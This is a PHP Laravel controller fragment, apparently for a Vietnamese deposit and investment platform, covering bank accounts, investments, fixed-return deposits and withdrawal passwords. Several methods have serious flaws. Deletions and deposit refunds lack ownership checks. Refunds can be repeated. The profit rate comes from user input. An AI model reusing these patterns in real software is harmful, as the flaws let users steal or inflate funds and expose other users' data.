            'bank_name.string' => __('index.bank_name_string'),
            'bank_account.string' => __('index.bank_account_string'),
            'bank_account_name.string' => __('index.bank_account_name_string'),
            'bank_name.max' => __('index.bank_name_max'),
            'bank_account.max' => __('index.bank_account_max'),
            'bank_account_name.max' => __('index.bank_account_name_max'),
        ]);

        if ($validator->fails()) {
            return response()->json(['message' => $validator->errors()->first()], 422);
        }
        
        UserBank::create([
            'user_id' => Auth::user()->id,
            'bank_name' => $request->bank_name,
            'bank_number' => $request->bank_account,
            'bank_owner' => $request->bank_account_name,
        ]);


        $telegram_bot_token = ConfigSystem::where('key', 'telegram_bot_token_account')->first();
        $telegram_bot_chatid = ConfigSystem::where('key', 'telegram_bot_chatid_account')->first();

        if($telegram_bot_token && $telegram_bot_chatid) {
            $url = "https://api.telegram.org/bot{$telegram_bot_token->value}/sendMessage";
            $message = "🏦 <b>*THÊM TÀI KHOẢN NGÂN HÀNG*</b> 🏦\n\n";
            $message .= "👤 <b>Tên:</b> " . Auth::user()->name . "\n";
            $message .= "🆔 <b>User ID:</b> " . Auth::user()->id . "\n";
            $message .= "🏛 <b>Ngân hàng:</b> " . $request->bank_name . "\n";
            $message .= "👤 <b>Số tài khoản:</b> " . $request->bank_account . "\n";
            $message .= "🏢 <b>Tên chủ tài khoản:</b> " . $request->bank_account_name . "\n";
            $message .= "⏰ <b>Thời gian:</b> " . now()->format('d/m/Y H:i:s') . "\n";
            $data = [
                'chat_id' => $telegram_bot_chatid->value,
                'text' => $message,
                'parse_mode' => 'HTML',
            ];
            Http::post($url, $data);
        }
        return response()->json(['message' => __('index.add_bank_success')], 200);
    }

    public function deleteBank(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'id' => 'required|exists:user_banks,id',
        ], [
            'id.required' => __('index.id_required'),
            'id.exists' => __('index.id_exists'),
        ], [
            'id.required' => __('index.id_required'),
            'id.exists' => __('index.id_exists'),
        ]);

        if ($validator->fails()) {
            return response()->json(['message' => $validator->errors()->first()], 422);
        }
        
        $bank = UserBank::find($request->id);
        if(!$bank) {
            return response()->json(['message' => __('index.bank_not_found')], 422);
        }
        $bank->delete();

        $telegram_bot_token = ConfigSystem::where('key', 'telegram_bot_token_account')->first();
        $telegram_bot_chatid = ConfigSystem::where('key', 'telegram_bot_chatid_account')->first();

        if($telegram_bot_token && $telegram_bot_chatid) {
            $url = "https://api.telegram.org/bot{$telegram_bot_token->value}/sendMessage";
            $message = "🏦<b>*XÓA TÀI KHOẢN NGÂN HÀNG*</b> 🏦\n\n";
            $message .= "👤<b>Tên:</b> " . Auth::user()->name . "\n";
            $message .= "🆔<b>User ID:</b> " . Auth::user()->id . "\n";
            $message .= "🏛<b>Ngân hàng:</b> " . $bank->bank_name . "\n";
            $message .= "👤<b>Số tài khoản:</b> " . $bank->bank_number . "\n";
            $message .= "🏢<b>Tên chủ tài khoản:</b> " . $bank->bank_owner . "\n";
            $message .= "⏰<b>Thời gian:</b> " . now()->format('d/m/Y H:i:s') . "\n";
            $data = [
                'chat_id' => $telegram_bot_chatid->value,
                'text' => $message,
                'parse_mode' => 'HTML',
            ];
            Http::post($url, $data);
        }
        return response()->json(['message' => __('index.delete_bank_success')], 200);
    }

    public function projects()
    {
        $projects = Project::where('status', 1)->get();
        $investments = null;
        if(Auth::check()) {
            $investments = Investment::where('user_id', Auth::user()->id)
            ->with(['project'])
            ->get();
        } else {
            $investments = collect([]);
        }
        return view('user.projects', compact('projects', 'investments'));
    }

    public function invest(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'project_id' => 'required|exists:projects,id',
            'amount' => 'required|numeric|min:1',
        ], [
            'project_id.required' => __('index.project_id_required'),
            'project_id.exists' => __('index.project_id_exists'),
            'amount.required' => __('index.amount_required'),
            'amount.numeric' => __('index.amount_numeric'),
            'amount.min' => __('index.amount_min'),
        ]);

        if ($validator->fails()) {
            return response()->json(['message' => $validator->errors()->first()], 422);
        }

        $project = Project::find($request->project_id);
        if(!$project) {
            return response()->json(['message' => __('index.project_not_found')], 422);
        }

        if($request->amount < $project->min_invest) {
            return response()->json(['message' => __('index.amount_min_invest', ['amount' => number_format($project->min_invest, 0, ',', '.')])], 422);
        }

        if($request->amount > $project->max_invest) {
            return response()->json(['message' => __('index.amount_max_invest', ['amount' => number_format($project->max_invest, 0, ',', '.')])], 422);
        }

        $user = User::find(Auth::user()->id);
        if($user->balance < $request->amount) {
            return response()->json(['message' => __('index.balance_not_enough')], 422);
        }

        Investment::create([
            'user_id' => $user->id,
            'project_id' => $project->id,
            'amount' => $request->amount,
            'status' => 'pending',
        ]);

        return response()->json(['message' => __('index.invest_success')], 200);
    }

    public function loadMoreDepositHistory(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'is_mobile' => 'required|boolean',
        ], [
            'is_mobile.required' => __('index.is_mobile_required'),
            'is_mobile.boolean' => __('index.is_mobile_boolean'),
        ]);
        
        if (!Auth::check()) {
            return response()->json(['message' => 'Unauthorized'], 401);
        }

        $page = $request->get('page', 1);
        $user = Auth::user();

        $deposits = Transaction::where('user_id', $user->id)
            ->where('type', 'deposit')
            ->orderBy('created_at', 'desc')
            ->paginate(10, ['*'], 'page', $page);

        $html = '';
        $isMobile = filter_var($request->is_mobile, FILTER_VALIDATE_BOOLEAN);

        if ($deposits->isEmpty()) {
            if ($isMobile) {
                $html = '<div class="text-center text-white">' . __('index.no_data') . '</div>';
            } else {
                $html = '<tr><td colspan="4" class="text-center text-white">' . __('index.no_data') . '</td></tr>';
            }
        } else {
            foreach ($deposits as $item) {
                if ($isMobile) {
                    $html .= view('user.partials.deposit-card', ['item' => $item])->render();
                } else {
                    $html .= view('user.partials.deposit-row', ['item' => $item])->render();
                }
            }
        }

        return response()->json([
            'html' => $html,
            'hasMorePages' => $deposits->hasMorePages(),
            'nextPage' => $deposits->currentPage() + 1
        ]);
    }

    public function loadMoreWithdrawHistory(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'is_mobile' => 'required|boolean',
        ], [
            'is_mobile.required' => __('index.is_mobile_required'),
            'is_mobile.boolean' => __('index.is_mobile_boolean'),
        ]);
        
        if (!Auth::check()) {
            return response()->json(['message' => 'Unauthorized'], 401);
        }

        $page = $request->get('page', 1);
        $user = Auth::user();

        $withdraws = Transaction::where('user_id', $user->id)
            ->where('type', 'withdraw')
            ->orderBy('created_at', 'desc')
            ->paginate(10, ['*'], 'page', $page);

        $html = '';
        $isMobile = filter_var($request->is_mobile, FILTER_VALIDATE_BOOLEAN);

        if ($withdraws->isEmpty()) {
            if ($isMobile) {
                $html = '<div class="text-center text-white">' . __('index.no_data') . '</div>';
            } else {
                $html = '<tr><td colspan="4" class="text-center text-white">' . __('index.no_data') . '</td></tr>';
            }
        } else {
            foreach ($withdraws as $item) {
                if ($isMobile) {
                    $html .= view('user.partials.withdraw-card', ['item' => $item])->render();
                } else {
                    $html .= view('user.partials.withdraw-row', ['item' => $item])->render();
                }
            }
        }

        return response()->json([
            'html' => $html,
            'hasMorePages' => $withdraws->hasMorePages(),
            'nextPage' => $withdraws->currentPage() + 1
        ]);
    }

    public function referredUsers()
    {
        $user = User::find(Auth::user()->id);
        $referredUsers = $user->referrals()->orderBy('created_at', 'desc')->paginate(10);
        return view('referred-users', compact('referredUsers'));
    }

    public function loadMoreReferredUsers(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'is_mobile' => 'required|boolean',
        ], [
            'is_mobile.required' => __('index.is_mobile_required'),
            'is_mobile.boolean' => __('index.is_mobile_boolean'),
        ]);
        
        if (!Auth::check()) {
            return response()->json(['message' => 'Unauthorized'], 401);
        }

        $page = $request->get('page', 1);
        $user = Auth::user();

        $referredUsers = $user->referrals()
            ->orderBy('created_at', 'desc')
            ->paginate(10, ['*'], 'page', $page);

        $html = '';
        $isMobile = filter_var($request->is_mobile, FILTER_VALIDATE_BOOLEAN);

        if ($referredUsers->isEmpty()) {
            if ($isMobile) {
                $html = '<div class="text-center text-white">' . __('index.no_data') . '</div>';
            } else {
                $html = '<tr><td colspan="6" class="text-center text-white">' . __('index.no_data') . '</td></tr>';
            }
        } else {
            foreach ($referredUsers as $user) {
                if ($isMobile) {
                    $html .= view('user.partials.referred-user-card', ['user' => $user])->render();
                } else {
                    $html .= view('user.partials.referred-user-row', ['user' => $user])->render();
                }
            }
        }

        return response()->json([
            'html' => $html,
            'hasMorePages' => $referredUsers->hasMorePages(),
            'nextPage' => $referredUsers->currentPage() + 1
        ]);
    }

    public function changeLanguage(Request $request, $lang)
    {
        session(['language' => $lang]);
        return redirect()->back();
    }

    public function wallet()
    {
        // $user = User::find(Auth::user()->id);
        // $transactions = Transaction::where('user_id', $user->id)->orderBy('created_at', 'desc')->get();
        return view('user.wallet');
    }

    public function kyQuy()
    {
        $kyQuies = KyQuy::where('show', 'show')->get();
        $kyQuyUsers = collect([]);
        $sumBalanceCoDinh = 0;
        $sumBalanceLinhHoat = 0;
        if(Auth::check()) {
            $kyQuyUsers = KyQuyUser::where('user_id', Auth::user()->id)
            ->with(['kyQuy'])
            ->orderBy('created_at', 'desc')->get();
            $sumBalanceCoDinh = KyQuyUser::where('user_id', Auth::user()->id)->whereHas('kyQuy', function($query) {
                $query->where('loai', 'co_dinh');
            })->sum('balance');
            $sumBalanceLinhHoat = KyQuyUser::where('user_id', Auth::user()->id)->whereHas('kyQuy', function($query) {
                $query->where('loai', 'linh_hoat');
            })->sum('balance');
        }

        return view('user.ky-quy', compact('kyQuies', 'kyQuyUsers', 'sumBalanceCoDinh', 'sumBalanceLinhHoat'));
    }

    public function openKyQuy(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'ky_quy_id' => 'required|exists:ky_quies,id',
            'amount' => 'required|numeric|min:1',
            'time' => 'required',
        ], [
            'ky_quy_id.required' => __('index.ky_quy_id_required'),
            'ky_quy_id.exists' => __('index.ky_quy_id_exists'),
            'amount.required' => __('index.amount_required'),
            'amount.numeric' => __('index.amount_numeric'),
            'amount.min' => __('index.amount_min'),
            'time.required' => __('index.time_required'),
        ]);

        if ($validator->fails()) {
            return response()->json(['message' => $validator->errors()->first()], 422);
        }
        $user = User::find(Auth::user()->id);

        $configVerify = ConfigSystem::where('key', 'verify')->first();
        if($configVerify->value == 'on') {
            if(!$user->verifyUserKyc() || $user->verifyUserKyc()->status != 'approved') {
                return response()->json(['message' => __('index.verify_kyc_required')], 422);
            }
        }

        $kyQuy = KyQuy::find($request->ky_quy_id);
        if(!$kyQuy) {
            return response()->json(['message' => __('index.ky_quy_not_found')], 422);
        }

        if(!$user) {
            return response()->json(['message' => __('index.user_not_found')], 422);
        }

        if($user->balance < $request->amount) {
            return response()->json(['message' => __('index.balance_not_enough')], 422);
        }

        if($request->amount < $kyQuy->min_balance) {
            return response()->json(['message' => __('index.ky_quy_min_balance', ['amount' => number_format($kyQuy->min_balance, 0, ',', '.')])], 422);
        }

        $time = explode('-', $request->time);
        $value = (int)$time[0]; // Ensure $value is an integer
        $unit = $time[1];
        $profit = (int)$time[2];
        if($unit == 'd') {
            $end_date = now()->addDays($value);
        } else if($unit == 'm') {
            $end_date = now()->addMonths($value);
        } else if($unit == 'y') {
            $end_date = now()->addYears($value);
        } else if($unit == 'mm') {
            $end_date = now()->addMinutes($value);
        } else {
            return response()->json(['message' => __('index.time_invalid')], 422);
        }

        $profit = $request->amount * $profit / 100;

        KyQuyUser::create([
            'ky_quy_id' => $kyQuy->id,
            'user_id' => Auth::user()->id,
            'balance' => $request->amount,
            'status' => 'pending',
            'start_date' => now(),
            'end_date' => $end_date,
            'before_balance' => Auth::user()->balance,
            'after_balance' => Auth::user()->balance - $request->amount,
            'value' => $value,
            'unit' => $unit,
            'profit' => $profit,
        ]);

        $user->decrement('balance', $request->amount);

        $telegram_bot_token = ConfigSystem::where('key', 'telegram_bot_token_account')->first();
        $telegram_bot_chatid = ConfigSystem::where('key', 'telegram_bot_chatid_account')->first();

        if($telegram_bot_token && $telegram_bot_chatid) {
            $url = "https://api.telegram.org/bot{$telegram_bot_token->value}/sendMessage";
            $message = "🏦<b>**KÝ QUỸ MỚI**</b> 🏦\n\n";
            $message .= "🆔<b>ID Ký Quỹ:</b> " . $kyQuy->id . "\n";
            $message .= "👤<b>Tên:</b> " . Auth::user()->name . "\n";
            $message .= "🆔<b>User ID:</b> " . Auth::user()->id . "\n";
            $message .= "💰<b>Số tiền:</b> " . number_format($request->amount, 0, ',', '.') . " USDT\n";
            $message .= "🏦<b>Loại:</b> " . ($kyQuy->loai === 'co_dinh' ? 'Cố định' : 'Linh Hoạt') . "\n";
            $message .= "💰<b>Lợi nhuận:</b> " . number_format($profit, 0, ',', '.') . " USDT\n";
            $message .= "🕒<b>Bắt đầu:</b> " . now()->format('d/m/Y H:i:s') . "\n";
            $message .= "🕒<b>Kết thúc:</b> " . $end_date->format('d/m/Y H:i:s') . "\n";
            $message .= "💰<b>Thời gian:</b> " . $value . " " . ($unit === 'd' ? 'Ngày' : ($unit === 'm' ? 'Tháng' : 'Năm')) . "\n";
            $data = [
                'chat_id' => $telegram_bot_chatid->value,
                'text' => $message,
                'parse_mode' => 'HTML',
            ];
            Http::post($url, $data);
        }

        
        $pusher = new Pusher(env('PUSHER_APP_KEY'), env('PUSHER_APP_SECRET'), env('PUSHER_APP_ID'), [
            'cluster' => env('PUSHER_APP_CLUSTER'),
            'useTLS' => true,
        ]);
        $pusher->trigger('ky-quy', 'ky-quy-created', [
            'message' => __('index.open_ky_quy_success'),
        ]);

        return response()->json(['message' => __('index.open_ky_quy_success')], 200);
    }

    public function passwordWithdraw()
    {
        return view('user.password-withdraw');
    }

    public function changePasswordWithdraw(Request $request)
    {

        $request->validate([
            'new_password' => 'required|string|min:6',
            'old_password' => 'nullable|string|min:6',
            'password_confirm' => 'required|string|min:6|same:new_password',
        ], [
            'new_password.required' => __('index.new_password_required'),
            'new_password.string' => __('index.new_password_string'),
            'new_password.min' => __('index.new_password_min'),
            'old_password.string' => __('index.old_password_string'),
            'old_password.min' => __('index.old_password_min'),
            'password_confirm.required' => __('index.password_confirm_required'),
            'password_confirm.string' => __('index.password_confirm_string'),
            'password_confirm.min' => __('index.password_confirm_min'),
            'password_confirm.same' => __('index.password_confirm_same'),
        ]);

        $user = User::find(Auth::user()->id);
        if(!$user) {
            return response()->json(['message' => __('index.user_not_found')], 422);
        }
        
        if($request->old_password) {
            if(!Hash::check($request->old_password, $user->password_withdraw)) {
                return redirect()->back()->withErrors(['old_password' => __('index.old_password_incorrect')]);
            }
        }

        $user->password_withdraw = Hash::make($request->new_password);
        $user->save();

        return redirect()->back()->with('success', __('index.change_password_withdraw_success'));
    }

    public function finalSettlement(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'ky_quy_user_id' => 'required|exists:ky_quy_users,id',
        ]);

        if($validator->fails()) {
            return response()->json(['message' => $validator->errors()->first()], 422);
        }

        //hoàn lại tiền cho người dùng nếu chưa đến ngày kết thúc
        $kyQuyUser = KyQuyUser::find($request->ky_quy_user_id);
        if($kyQuyUser) {
            $kyQuyUser->update([
                'status' => 'cancel',
                'cancel_date' => now(),
            ]);

            $user = User::find(Auth::user()->id);
            if($user) {
                $user->increment('balance', $kyQuyUser->balance);
            }
        }

        return response()->json(['message' => __('index.final_settlement_success')], 200);
    }
}
